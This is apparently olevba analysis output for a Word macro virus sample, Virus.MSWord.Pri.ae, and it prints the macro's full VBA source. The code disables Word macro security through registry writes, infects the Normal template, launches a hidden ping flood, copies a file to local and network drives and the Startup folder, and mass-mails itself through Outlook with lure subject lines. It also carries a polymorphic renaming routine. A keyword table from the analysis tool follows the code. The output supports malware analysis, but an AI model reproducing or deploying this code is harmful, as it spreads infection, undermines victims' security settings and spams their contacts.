olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'This Word XP virus was created using NWXPG
'code by Necronomikon/[Zer0Gravity]
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
Application.AutomationSecurity = msoAutomationSecurityForceDisable
System.PrivateProfileString("HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security       AccessVBOM") = 1&
win = Environ("windir")
docz = win & "\re.doc"
UnKqCqLm = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VhPrFhRz = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "pri" Then
Set JyVwHqMr = ActiveDocument.VBProject.VBComponents.Item(1)
RfPsJgNf = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "pri" Then
Set JyVwHqMr = NormalTemplate.VBProject.VBComponents.Item(1)
CyOhDjJq = True
ActiveDocument.Saved = True
End If
If GetAttr(ActiveDocument.FullName) = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If CyOhDjJq <> True And RfPsJgNf <> True Then GoTo EtRnErSz
EtRnErSz:
If VhPrFhRz <> 0 And UnKqCqLm = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
SetAttr ActiveDocument.FullName, 1
ActiveDocument.Saved = True: End If
OurCode = NPE(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines))
Shell " ping -l 50000 -t http://www.microsoft.com/", vbHide '""

Call network
End Sub
Sub infect(drive)
On Error Resume Next
Dim s, f
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile("c:\WINDOWS\necro.mp3")
f.Copy (drive & "\pussy.com")
f.Copy (drive & "\windows\startm~1\programs\startup\msdos.com")
End Sub
Function ShowDriveType(drvpath)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetDrive(drvpath)
Select Case d.DriveType
Case 0: t = "Unknown"
Case 1: t = "Removable"
Case 2: t = "Fixed"
Case 3: t = "Network"
Case 4: t = "CD-ROM"
Case 5: t = "RAM Disk"
End Select
If t = "" Then t = "None"
ShowDriveType = t
End Function
Sub network()
On Error Resume Next
Dim n, l, d3, drv
For n = 65 To 90
l = Chr(n)
drv = l & ":"
d3 = ShowDriveType(drv)
If d3 = "Fixed" Then infect (drv)
If d3 = "Network" Then infect (drv)
Next n
End Sub
Sub AutoClose()
On Error Resume Next
Rem taken from Word97/2K/XP.Tijor by Ultras[MATRiX]
Dim win, packIt
win = Environ("windir")
packIt = UUEncode(win & "\re.doc", win & "\" & "" & Application.UserName & "" & ".uue")
Set OutlookApp = CreateObject("Outlook.Application")
Set MAPIuz = OutlookApp.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\nwxpg\", "nwxpg") <> "by Necronomikon[Zerogravity]" Then
If OutlookApp = "Outlook" Then
MAPIuz.Logon "profile", "password"
For Address = 1 To MAPIuz.AddressLists.Count
Set AddyBook = MAPIuz.AddressLists(Address)
countz = 1
Set Guan0utlook = OutlookApp.CreateItem(0)
For mmez = 1 To AddyBook.AddressEntries.Count
AddBZ = AddyBook.AddressEntries(countz)
Guan0utlook.Recipients.Add AddBZ
countz = countz + 1
If countz > 30 Then oo = AddyBook.AddressEntries.Count
Next mmez
Randomize
numberz = Int(Rnd * 9) + 1
If numberz = 1 Then mez$ = "Read this..."
If numberz = 2 Then mez$ = "" & Application.UserName & " :)"
If numberz = 3 Then mez$ = "Unpack it."
If numberz = 4 Then mez$ = "New story"
If numberz = 5 Then mez$ = "Re:"
If numberz = 6 Then mez$ = "Important Info"
If numberz = 7 Then mez$ = "This is interesting..."
If numberz = 8 Then mez$ = "Look what I found..."
If numberz = 9 Then mez$ = "Check this out..."
Guan0utlook.Subject = mez$
Guan0utlook.Body = mez$
Guan0utlook.Attachments.Add win & "\" & "" & Application.UserName & "" & ".uue"
Guan0utlook.Send
AddBZ = ""
Next Address
MAPIuz.Logoff
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\nwxpg\", "nwxpg") <> "by Necronomikon[Zerogravity]" Then
End If
End Sub
Function Encode(sDa As String) As String
Dim szOut As String
Dim nChar As Integer
Dim i As Integer
If Len(sDa) Mod 3 <> 0 Then sDa = sDa & Space(3 - Len(sDa) Mod 3)
For i = 1 To Len(sDa) Step 3
szOut = szOut & Chr(Asc(Mid(sDa, i, 1)) \ 4 + 32)
szOut = szOut & Chr((Asc(Mid(sDa, i, 1)) Mod 4) * 16 + Asc(Mid(sDa, i + 1, 1)) \ 16 + 32)
szOut = szOut & Chr((Asc(Mid(sDa, i + 1, 1)) Mod 16) * 4 + Asc(Mid(sDa, i + 2, 1)) \ 64 + 32)
szOut = szOut & Chr(Asc(Mid(sDa, i + 2, 1)) Mod 64 + 32)
Next i
Encode = szOut
End Function
Function UUEncode(fileIn As String, fileOut As String) As Integer
Dim nFi As Integer, nFo As Integer
Dim indx As Integer, sDa As String
Dim lbytei As Long, lfull As Long, lmaxl As Long
On Error GoTo ERR_UUEncode
nFi = FreeFile
Open fileIn For Binary As nFi
lbytei = LOF(nFi)
nFo = FreeFile
Open fileOut For Output As nFo
For indx = Len(fileIn) - 1 To 1 Step -1
If Mid$(fileIn, indx, 1) = "\" Then
fileIn = Mid$(fileIn, indx + 1)
Exit For
End If
Next
Print #nFo, "begin 644 " & fileIn
lfull = lbytei \ 45
sDa = Space(45)
While lfull > 0
Get nFi, , sDa
Print #nFo, "M" & Encode(sDa)
lfull = lfull - 1
DoEvents
Wend
sDa = Space(lbytei Mod 45)
Get nFi, , sDa
Print #nFo, Chr(Len(sDa) + 32) & Encode(sDa)
Print #nFo, "end"
Close nFi
Close nFo
ERR_UUEncode:
Close nFi
Close nFo
Exit Function
End Function
Private Function NPE(poly)
Rem Necronomikon's Polymorph Engine
Dim VaR(6): On Error Resume Next: Randomize
VaR(1) = "poly": VaR(2) = "NPE": VaR(3) = "VaR": VaR(4) = "nec"
VaR(5) = "morph": VaR(6) = "NewVar"
For nec = 1 To 6
nec_nec = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
While InStr(1, poly, VaR(nec), vbTextCompare)
morph = InStr(1, poly, VaR(nec), vbTextCompare)
poly = Mid(poly, 1, morph - 1) & NewVar & Mid(poly, morph + Len(VaR(nec)), Len(poly) - morph)
Wend
Next
NPE = poly
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/               |                                             |
+----------+--------------------+---------------------------------------------+

